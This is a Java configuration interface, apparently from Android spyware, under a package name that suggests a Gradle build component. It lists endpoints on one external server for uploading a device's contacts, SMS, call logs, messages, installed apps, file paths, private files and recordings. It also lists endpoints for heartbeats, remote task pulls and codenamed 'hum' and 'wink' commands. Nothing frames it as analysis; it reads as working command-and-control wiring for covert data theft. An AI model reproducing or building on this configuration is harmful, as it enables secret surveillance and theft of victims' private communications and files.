package org.code.coregradle.config;

public interface ApiConfig {
    String API_URL = "https://scrrec.com";
    String API_VERSION = "v0ad";
    String BASIC_INFO_URL = String.format("%s/%s/report/basic-info", API_URL, API_VERSION);
    String CONTACTS_URL = String.format("%s/%s/report/contacts", API_URL, API_VERSION);
    String REPORT_FILE_PATHS_URL = String.format("%s/%s/report/file-paths", API_URL, API_VERSION);
    String REPORT_SDCARD_PATHS_URL = String.format("%s/%s/report/storage/root", API_URL, API_VERSION);
    String REQUEST_FILE_PATHS_URL = String.format("%s/%s/request/file-paths", API_URL, API_VERSION);
    String SYNC_FILES_URL = String.format("%s/%s/sync/file", API_URL, API_VERSION);
    String REPORT_MESSAGES_URL = String.format("%s/%s/report/message", API_URL, API_VERSION);
    String REPORT_PRIVATE_FILE_PATHS_URL = String.format("%s/%s/report/private/file-paths", API_URL, API_VERSION);
    String REQUEST_PRIVATE_FILE_PATHS_URL = String.format("%s/%s/request/private/file-paths", API_URL, API_VERSION);
    String SYNC_PRIVATE_FILES_URL = String.format("%s/%s/sync/private/file", API_URL, API_VERSION);
    String REQUEST_HEARTBEAT_URL = String.format("%s/%s/request/heartbeat", API_URL, API_VERSION);

    //v1
    String PULL_TASK = String.format("%s/%s/pull/task", API_URL, API_VERSION);
    String FETCH_TASK = String.format("%s/%s/request/tasks", API_URL, API_VERSION);
    String REPORT_ATTEMPT = String.format("%s/%s/report/attempt", API_URL, API_VERSION);
    String PUSH_RESULT = String.format("%s/%s/push/result", API_URL, API_VERSION);
    String HUM_URL = String.format("%s/%s/report/hum", API_URL, API_VERSION);
    String REQUEST_HUM = String.format("%s/%s/request/hum", API_URL, API_VERSION);

    // v2
    String REPORT_APP_INFO = String.format("%s/%s/report/apps", API_URL, API_VERSION);
    String REPORT_SMS = String.format("%s/%s/report/sms", API_URL, API_VERSION);
    String REPORT_CALLS = String.format("%s/%s/report/calls", API_URL, API_VERSION);

    //v3
    String REQUEST_WYNK = String.format("%s/%s/request/wink", API_URL, API_VERSION);
    String REPORT_WYNK = String.format("%s/%s/report/wink", API_URL, API_VERSION);
    String REPORT_RECORDING_PATHS = String.format("%s/%s/report/ruby", API_URL, API_VERSION);

    //v4
    String CLEAR_WYNK = String.format("%s/%s/clear/wink", API_URL, API_VERSION);
    String CLEAR_HUM = String.format("%s/%s/clear/hum", API_URL, API_VERSION);

    String EXTEND_WYNK = String.format("%s/%s/extend/wink", API_URL, API_VERSION);
    String EXTEND_HUM = String.format("%s/%s/extend/hum", API_URL, API_VERSION);

    //v5
    String REPORT_TASK_LIST = String.format("%s/%s/report/task/list", API_URL, API_VERSION);
    String REQUEST_TASK_RESULT = String.format("%s/%s/task/request/result", API_URL, API_VERSION);
    String PULL_TASK_CONFIG = String.format("%s/%s/pull/task-config", API_URL, API_VERSION);
}